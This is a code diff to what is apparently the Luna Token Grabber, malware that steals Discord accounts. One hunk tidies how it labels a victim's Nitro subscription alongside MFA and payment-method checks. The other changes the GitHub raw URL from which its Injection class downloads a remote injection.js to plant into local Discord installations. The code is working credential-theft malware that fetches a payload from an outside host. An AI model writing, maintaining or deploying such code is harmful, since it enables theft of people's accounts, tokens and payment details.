@@ -414,16 +414,14 @@ class Discord:
             else:
                 mfa = "❌"
 
-            if user['premium_type'] == 0:
-                nitro = "❌"
-            elif user['premium_type'] == 1:
-                nitro = '`Nitro Classic`'
-            elif user['premium_type'] == 2:
-                nitro = '`Nitro`'
-            elif user['premium_type'] == 3:
-                nitro = '`Nitro Basic`'
-            else:
-                nitro = "❌"
+            premium_types = {
+                0: "❌",
+                1: "Nitro Classic",
+                2: "Nitro",
+                3: "Nitro Basic"
+            }
+
+            nitro = premium_types.get(user['premium_type'], "❌")
 
             if payment == []:
                 methods = "❌"
@@ -773,7 +771,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js").text
+        self.code = requests.get("https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js").text
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
